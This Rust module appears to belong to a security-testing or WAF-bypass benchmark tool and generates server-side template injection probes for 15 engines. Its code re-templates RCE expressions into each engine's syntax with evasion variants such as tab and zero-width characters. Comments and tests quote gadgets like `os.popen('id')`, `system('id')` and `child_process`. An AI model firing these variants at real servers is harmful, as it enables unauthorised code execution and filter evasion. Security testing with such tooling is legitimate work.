//! Template injection grammar-aware payload mutation.
//!
//! Generates server-side template injection probes across multiple template
//! engines while preserving the same exploit class: expression evaluation,
//! control-flow execution, and runtime-introspection gadgets.
//!
//! # Supported Engines
//!
//! 1. Jinja2 - Python templating with expression evaluation
//! 2. Twig - PHP templating engine  
//! 3. Freemarker - Java templating with object construction
//! 4. Pebble - Java reflection-style expressions
//! 5. Velocity - Java assignment and class inspection
//! 6. ERB - Ruby evaluation and command execution
//! 7. Smarty - PHP template engine
//! 8. Thymeleaf - Java XML-based templating
//! 9. Pug - Node.js templating
//! 10. Nunjucks - JavaScript templating
//! 11. Mako - Python templating
//! 12. Blade - PHP Laravel templating
//! 13. Liquid - Ruby templating (Shopify)
//! 14. Handlebars - JavaScript templating
//! 15. EJS - Embedded JavaScript templating
//!
//! # Architecture
//!
//! Payloads are loaded from `rules/templates.toml` at compile time for
//! reliability and performance. The TOML structure allows adding new engines
//! without code changes.

use serde::Deserialize;
use std::collections::BTreeSet;

/// Template engine definition loaded from TOML.
#[derive(Debug, Clone, Deserialize)]
struct Engine {
    /// Engine name (e.g., "jinja2", "twig") — used by `supported_engines()`.
    name: String,
    /// Detection delimiters (e.g., ["{{", "}}"])
    delimiters: Vec<String>,
    /// Human-readable description in TOML; not consumed at runtime.
    #[serde(rename = "description", default)]
    _description: String,
    /// Category in TOML (python, java, php, …); not consumed at runtime.
    #[serde(rename = "category", default)]
    _category: String,
    /// List of payloads for this engine
    #[serde(default)]
    payloads: Vec<Payload>,
}

/// Individual payload definition.
#[derive(Debug, Clone, Deserialize)]
struct Payload {
    /// Payload type in TOML (expression, rce, …); not consumed at runtime.
    #[serde(rename = "type", default)]
    _payload_type: String,
    /// The actual payload string
    payload: String,
    /// Human-readable description in TOML; not consumed at runtime.
    #[serde(rename = "description", default)]
    _description: String,
}

/// Polyglot payload definition.
#[derive(Debug, Clone, Deserialize)]
struct Polyglot {
    /// Name in TOML; not consumed at runtime.
    #[serde(rename = "name", default)]
    _name: String,
    /// Description in TOML; not consumed at runtime.
    #[serde(rename = "description", default)]
    _description: String,
    payload: String,
}

/// Root structure for templates.toml.
#[derive(Debug, Clone, Deserialize)]
struct TemplateRules {
    #[serde(default)]
    engine: Vec<Engine>,
    #[serde(default)]
    polyglot: Vec<Polyglot>,
}

impl Default for TemplateRules {
    fn default() -> Self {
        Self {
            engine: vec![Engine {
                name: "jinja2".into(),
                delimiters: vec!["{{".into(), "}}".into(), "{%".into(), "%}".into()],
                _description: "Python Jinja2".into(),
                _category: "python".into(),
                payloads: vec![Payload {
                    _payload_type: "expression".into(),
                    payload: "{{7*7}}".into(),
                    _description: "Basic arithmetic".into(),
                }],
            }],
            polyglot: vec![Polyglot {
                _name: "polyglot_probe".into(),
                _description: "Universal probe".into(),
                payload: "${{<%[%'\"}}%\\.".into(),
            }],
        }
    }
}

/// Compile-time embedded TOML rules for reliability.
const TEMPLATE_RULES_TOML: &str = include_str!("../../rules/templates.toml");

/// Parse the embedded TOML rules once at first access.
fn get_rules() -> &'static TemplateRules {
    use std::sync::OnceLock;
    static RULES: OnceLock<TemplateRules> = OnceLock::new();
    RULES.get_or_init(|| {
        toml::from_str(TEMPLATE_RULES_TOML).unwrap_or_else(|e| {
            tracing::warn!(error = %e, "invalid TOML in rules/templates.toml");
            TemplateRules::default()
        })
    })
}

/// Generate semantic-preserving template-injection mutations for a candidate payload.
#[must_use]
pub fn mutate(payload: &str) -> Vec<String> {
    if payload.is_empty() || !detect_type(payload) {
        return Vec::new();
    }

    // ANTI-RIG: a structured SSTI carries an RCE / data-exfil
    // expression (`__globals__…popen('id')`, `T(java.lang.Runtime)`,
    // `freemarker…Execute`). Dumping the canned `{{7*7}}` engine-probe
    // library for it discards the exploit and ships a mere *detection*
    // probe — the de-rigged bench would then claim "RCE bypassed the
    // WAF" when only `7*7` was ever sent. Re-template the operator's
    // ACTUAL expression into every engine's delimiters instead. A bare
    // `{{7*7}}` / `{{user}}` probe is NOT structured: there the canned
    // engine library IS the correct engine-fingerprinting product.
    if is_structured_ssti(payload) {
        return structured_ssti_mutate(payload);
    }

    let mut results = BTreeSet::new();
    let rules = get_rules();

    // Add all engine payloads
    for engine in &rules.engine {
        for p in &engine.payloads {
            results.insert(p.payload.clone());
        }
    }

    // Add polyglot payloads
    for polyglot in &rules.polyglot {
        results.insert(polyglot.payload.clone());
    }

    // Context-aware mutations based on detected syntax
    if payload.contains("{{") {
        results.insert(payload.replace("{{", "{{7*7}}{{"));
    }
    if payload.contains("${") {
        results.insert(payload.replace("${", "${7*7}${"));
    }
    if payload.contains("<%") {
        results.insert(payload.replace("<%", "<%= 7*7 %><%"));
    }
    if payload.contains("#{") {
        results.insert(payload.replace("#{", "#{7*7}#{"));
    }
    if payload.contains("@{") {
        results.insert(payload.replace("@{", "@{7*7}@{"));
    }

    results.remove(payload);
    results.into_iter().collect()
}

/// Detect whether a payload looks like a template expression or template injection probe.
///
/// Checks delimiters for all supported engines:
/// - Jinja2/Twig/Nunjucks/Liquid: `{{`, `}}`, `{%`, `%}`
/// - Freemarker: `${`, `<#assign`, `>`
/// - Pebble/Blade: `{{`, `}}`
/// - Velocity: `#{`, `$`, `#set(`
/// - ERB/EJS: `<%`, `%>`, `<%=`
/// - Smarty: `{`, `}` (contextual)
/// - Thymeleaf: `th:`, `${`, `}`
/// - Pug: `#{`, `!{`, `- `
/// - Mako: `${`, `<%`, `%>`
/// - Handlebars: `{{{`, `}}}`
#[must_use]
pub fn detect_type(payload: &str) -> bool {
    let lower = payload.to_ascii_lowercase();
    let rules = get_rules();

    // Audit (2026-05-10): pre-fix this fired on ANY input containing
    // a single delimiter character because Smarty / Velocity declare
    // 1-char delims (`{`, `}`, `#`, `$`). JSON, CSS, C, Python, and
    // Markdown all false-positived. The fix: ignore single-char
    // delimiters from the global sweep entirely (Smarty/Velocity rely
    // on the structured checks further down: `{$`, `{php}`, `#set`,
    // `$!`, etc.) and accept a multi-char delimiter as a positive
    // match — those are 2+ characters and unique enough to a template
    // engine that a benign substring rarely contains them.
    for engine in &rules.engine {
        for delimiter in &engine.delimiters {
            if delimiter.chars().count() < 2 {
                continue; // skip 1-char delims; they FP everywhere
            }
            if payload.contains(delimiter.as_str()) {
                return true;
            }
        }
    }

    // Additional context-aware checks for ambiguous delimiters
    // Smarty: { followed by $ or specific keywords (not just any braces)
    if payload.contains("{$") || lower.contains("{php}") || lower.contains("{smarty") {
        return true;
    }

    // Velocity (audit 2026-05-10): the engine declares 1-char delims
    // (`#`, `$`) which we now skip in the global sweep to avoid FPs on
    // CSS / Markdown / shell. Recover Velocity recall via its real
    // syntactic markers.
    if lower.contains("#set(")
        || lower.contains("#if(")
        || lower.contains("#foreach(")
        || lower.contains("#parse(")
        || lower.contains("#evaluate(")
        || lower.contains("#include(")
        || lower.contains("#macro(")
        || lower.contains("#{")
        || lower.contains("$class.")
        || lower.contains("$runtime.")
        || lower.contains("$context.")
    {
        return true;
    }
    // (Note: `${` is freemarker — already caught above as a multi-char
    // delimiter — so we deliberately don't list it here. Adding it
    // would re-introduce the shell-variable FP `$ ls /tmp/$user/`.)

    // Thymeleaf namespace prefix
    if lower.contains("th:") || lower.contains("th-") {
        return true;
    }

    // Pug/Jade specific patterns
    if lower.contains("- require(") || lower.contains("= global.process") {
        return true;
    }

    // Blade directives
    if lower.contains("@php") || lower.contains("@endphp") || lower.contains("{!!") {
        return true;
    }

    // Mako specific patterns
    if lower.contains("<%!") || lower.contains("<%def") || lower.contains("<%namespace") {
        return true;
    }

    // Handlebars helpers
    if lower.contains("{{#") || lower.contains("{{/") || lower.contains("{{>") {
        return true;
    }

    // EJS specific patterns
    if lower.contains("<%-") || lower.contains("<%_") || lower.contains("_%>") {
        return true;
    }

    // Velocity-specific patterns beyond delimiters
    if lower.contains("$!{") || lower.contains("#macro") || lower.contains("#parse") {
        return true;
    }

    false
}

/// Get all supported engine names.
#[must_use]
pub fn supported_engines() -> Vec<&'static str> {
    let rules = get_rules();
    rules.engine.iter().map(|e| e.name.as_str()).collect()
}

/// Get payloads for a specific engine by name.
#[must_use]
pub fn get_engine_payloads(engine_name: &str) -> Vec<String> {
    let rules = get_rules();
    rules
        .engine
        .iter()
        .find(|e| e.name.eq_ignore_ascii_case(engine_name))
        .map(|e| e.payloads.iter().map(|p| p.payload.clone()).collect())
        .unwrap_or_default()
}

/// True when the payload's value is a *concrete RCE / data-exfil*
/// expression, not a bare engine-detection probe. `{{7*7}}` / `${7*7}`
/// / `{{user}}` are demonstrators — the canned engine library is their
/// correct equivalent. `{{cycler.__init__.__globals__.os.popen('id')}}`
/// is an exploit: replacing it with `{{7*7}}` throws it away.
pub(crate) fn is_structured_ssti(payload: &str) -> bool {
    let lc = payload.to_ascii_lowercase();
    const STRUCTURED: &[&str] = &[
        ".__class__",
        "__globals__",
        "__subclasses__",
        "__mro__",
        "__init__",
        "__builtins__",
        "__import__",
        "''.__",
        "().__",
        "[].__",
        "popen",
        "subprocess",
        "os.system",
        "system(",
        ".read()",
        "lipsum",
        "cycler",
        "request.application",
        "config.items",
        "config.__",
        "|attr(",
        "getruntime",
        "runtime",
        "processbuilder",
        "freemarker.template.utility.execute",
        "execute\")",
        "t(java",
        "t(org",
        "getclass(",
        "reflect",
        "import os",
        "exec(",
        "eval(",
        "scriptengine",
        "javax.script",
        "new (\"",
        "#set($",
        "$class.inspect",
        "/etc/passwd",
        "cat /",
        "whoami",
        "id;",
        "curl ",
        "wget ",
    ];
    STRUCTURED.iter().any(|m| lc.contains(m))
}

/// Pull the operator's actual template expression out of its
/// delimiters so it can be re-templated into other engines.
fn extract_template_expr(payload: &str) -> Option<String> {
    for (open, close) in [
        ("{{", "}}"),
        ("{%", "%}"),
        ("${", "}"),
        ("#{", "}"),
        ("<%", "%>"),
        ("@{", "}"),
    ] {
        if let Some(o) = payload.find(open) {
            let after = &payload[o + open.len()..];
            if let Some(c) = after.find(close) {
                let mut expr = after[..c].trim();
                expr = expr.trim_start_matches('=').trim();
                if !expr.is_empty() {
                    return Some(expr.to_string());
                }
            }
        }
    }
    None
}

/// Structured-SSTI path: re-template the operator's REAL expression
/// into every engine's syntax + evasion shapes, then enforce that each
/// surviving variant still carries the expression (chokepoint). The
/// SSTI analogue of the XSS / SQL anti-rig gates.
fn structured_ssti_mutate(payload: &str) -> Vec<String> {
    let mut out: BTreeSet<String> = BTreeSet::new();
    // The attack exactly as written is always a valid candidate.
    out.insert(payload.trim().to_string());

    if let Some(e) = extract_template_expr(payload) {
        for v in [
            format!("{{{{{e}}}}}"),         // {{ EXPR }}
            format!("{{{{ {e} }}}}"),       // spaced
            format!("{{{{\t{e}}}}}"),       // tab evasion
            format!("{{{{{e}|safe}}}}"),    // jinja |safe
            format!("{{%print({e})%}}"),    // jinja statement form
            format!("${{{e}}}"),            // freemarker / mako
            format!("#{{{e}}}"),            // velocity / pug
            format!("<%= {e} %>"),          // erb / ejs
            format!("<%={e}%>"),            // erb tight
            format!("{{{e}}}"),             // smarty single-brace
            format!("${{{{{e}}}}}"),        // ${{ EXPR }}
            format!("#set($x={e})$x"),      // velocity assign-exec
            format!("{{{{{e}}}}}\u{200b}"), // zero-width suffix
        ] {
            out.insert(v);
        }
    }

    // Chokepoint: every variant MUST still carry the exploit. Tokens =
    // alnum runs ≥4 of the inner expression; a variant carrying none
    // is no longer this attack.
    if let Some(e) = extract_template_expr(payload) {
        let markers: Vec<String> = e
            .to_ascii_lowercase()
            .split(|c: char| !c.is_ascii_alphanumeric())
            .filter(|t| t.len() >= 4 && t.chars().any(|c| c.is_ascii_alphabetic()))
            .map(str::to_string)
            .collect();
        if !markers.is_empty() {
            out.retain(|v| {
                let lc = v.to_ascii_lowercase();
                markers.iter().any(|m| lc.contains(m.as_str()))
            });
        }
    }

    out.into_iter().collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_jinja_syntax() {
        assert!(detect_type("{{ user.name }}"));
        assert!(detect_type("{% if user %}"));
    }

    #[test]
    fn detects_twig_syntax() {
        assert!(detect_type("{{ 7*7 }}"));
        assert!(detect_type("{% for item in items %}"));
    }

    #[test]
    fn detects_freemarker_syntax() {
        assert!(detect_type("${user}"));
        assert!(detect_type("<#assign x=1>"));
    }

    #[test]
    fn detects_pebble_syntax() {
        assert!(detect_type("{{ user }}"));
    }

    #[test]
    fn detects_velocity_syntax() {
        assert!(detect_type("#{user}"));
        assert!(detect_type("#set($x=1)"));
        assert!(detect_type("$class.inspect"));
    }

    #[test]
    fn detects_erb_syntax() {
        assert!(detect_type("<%= 7*7 %>"));
        assert!(detect_type("<% if true %>"));
    }

    #[test]
    fn detects_smarty_syntax() {
        assert!(detect_type("{$user}"));
        assert!(detect_type("{php}echo 1{/php}"));
    }

    #[test]
    fn detects_thymeleaf_syntax() {
        assert!(detect_type("th:text=\"${user}\""));
        assert!(detect_type("th:value=\"${name}\""));
    }

    #[test]
    fn detects_pug_syntax() {
        assert!(detect_type("#{user}"));
        assert!(detect_type("!{html}"));
        assert!(detect_type("- console.log(1)"));
    }

    #[test]
    fn detects_nunjucks_syntax() {
        assert!(detect_type("{{ user }}"));
        assert!(detect_type("{% extends \"base.html\" %}"));
    }

    #[test]
    fn detects_mako_syntax() {
        assert!(detect_type("${user}"));
        assert!(detect_type("<% import os %>"));
    }

    #[test]
    fn detects_blade_syntax() {
        assert!(detect_type("{{ $user }}"));
        assert!(detect_type("@php echo 1; @endphp"));
        assert!(detect_type("{!! $html !!}"));
    }

    #[test]
    fn detects_liquid_syntax() {
        assert!(detect_type("{{ user }}"));
        assert!(detect_type("{% assign x = 1 %}"));
    }

    #[test]
    fn detects_handlebars_syntax() {
        assert!(detect_type("{{ user }}"));
        assert!(detect_type("{{{ unescaped }}}"));
        assert!(detect_type("{{#each items}}{{/each}}"));
    }

    #[test]
    fn detects_ejs_syntax() {
        assert!(detect_type("<%= user %>"));
        assert!(detect_type("<% if (true) { %>"));
        assert!(detect_type("<%- include('header') %>"));
    }

    #[test]
    fn rejects_plain_text() {
        assert!(!detect_type("ordinary content only"));
        assert!(!detect_type("Hello World"));
        assert!(!detect_type("No template here"));
    }

    #[test]
    fn generates_jinja_variants() {
        let mutations = mutate("{{user}}");
        assert!(mutations.iter().any(|item| item == "{{7*7}}"));
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("__class__.__mro__"))
        );
        assert!(mutations.iter().any(|item| item.contains("range(10)")));
    }

    #[test]
    fn generates_freemarker_variants() {
        let mutations = mutate("${user}");
        assert!(mutations.iter().any(|item| item == "${7*7}"));
        assert!(mutations.iter().any(|item| item.contains("<#assign")));
        assert!(mutations.iter().any(|item| item.contains("?new()")));
    }

    #[test]
    fn generates_pebble_variants() {
        let mutations = mutate("{{user}}");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("getClass().forName"))
        );
    }

    #[test]
    fn generates_erb_variants() {
        let mutations = mutate("<%= user %>");
        assert!(mutations.iter().any(|item| item == "<%= 7*7 %>"));
        assert!(mutations.iter().any(|item| item.contains("system('id')")));
    }

    #[test]
    fn generates_smarty_variants() {
        let mutations = mutate("${user}");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("{php}echo 'test';{/php}"))
        );
    }

    #[test]
    fn generates_velocity_variants() {
        let mutations = mutate("#{user}");
        assert!(mutations.iter().any(|item| item.contains("#set($x=7*7)")));
        assert!(mutations.iter().any(|item| item.contains("$class.inspect")));
    }

    #[test]
    fn generates_thymeleaf_variants() {
        let mutations = mutate("th:text\"");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("th:text=\"${7*7}\""))
        );
    }

    #[test]
    fn generates_pug_variants() {
        let mutations = mutate("#{user}");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("require('child_process')"))
        );
    }

    #[test]
    fn generates_nunjucks_variants() {
        let mutations = mutate("{{user}}");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("range.constructor"))
        );
    }

    #[test]
    fn generates_mako_variants() {
        let mutations = mutate("${user}");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("__import__('os')"))
        );
    }

    #[test]
    fn generates_blade_variants() {
        let mutations = mutate("{{user}}");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("@php") || item == "{{7*7}}")
        );
    }

    #[test]
    fn generates_liquid_variants() {
        let mutations = mutate("{{user}}");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("inspect") || item == "{{7*7}}")
        );
    }

    #[test]
    fn generates_handlebars_variants() {
        let mutations = mutate("{{user}}");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("constructor") || item == "{{7*7}}")
        );
    }

    #[test]
    fn generates_ejs_variants() {
        let mutations = mutate("<%= user %>");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("require('child_process')"))
        );
    }

    #[test]
    fn generates_polyglot_variant() {
        let mutations = mutate("{{user}}");
        assert!(mutations.iter().any(|item| item == "${{<%[%'\"}}%\\."));
    }

    #[test]
    fn empty_payload_returns_empty() {
        let mutations = mutate("");
        assert!(mutations.is_empty());
    }

    #[test]
    fn non_template_payload_returns_empty() {
        let mutations = mutate("hello world");
        assert!(mutations.is_empty());
    }

    #[test]
    fn supported_engines_listed() {
        let engines = supported_engines();
        assert!(engines.contains(&"jinja2"));
        assert!(engines.contains(&"twig"));
        assert!(engines.contains(&"freemarker"));
        assert!(engines.contains(&"velocity"));
        assert!(engines.contains(&"erb"));
        assert!(engines.contains(&"smarty"));
        assert!(engines.contains(&"thymeleaf"));
        assert!(engines.contains(&"pug"));
        assert!(engines.contains(&"nunjucks"));
        assert!(engines.contains(&"mako"));
        assert!(engines.contains(&"blade"));
        assert!(engines.contains(&"liquid"));
        assert!(engines.contains(&"handlebars"));
        assert!(engines.contains(&"ejs"));
    }

    #[test]
    fn get_engine_payloads_returns_correct_payloads() {
        let jinja_payloads = get_engine_payloads("jinja2");
        assert!(!jinja_payloads.is_empty());
        assert!(jinja_payloads.iter().any(|p| p.contains("7*7")));
        assert!(jinja_payloads.iter().any(|p| p.contains("__class__")));

        let unknown = get_engine_payloads("nonexistent");
        assert!(unknown.is_empty());
    }

    #[test]
    fn context_aware_mutations_work() {
        // Jinja-style context
        let jinja = mutate("{{user}}");
        assert!(jinja.iter().any(|p| p.contains("{{7*7}}{{")));

        // Freemarker-style context
        let freemarker = mutate("${user}");
        assert!(freemarker.iter().any(|p| p.contains("${7*7}${")));

        // ERB-style context
        let erb = mutate("<%= user %>");
        assert!(erb.iter().any(|p| p.contains("<%= 7*7 %><%")));

        // Velocity-style context
        let velocity = mutate("#{user}");
        assert!(velocity.iter().any(|p| p.contains("#{7*7}#{")));
    }
}
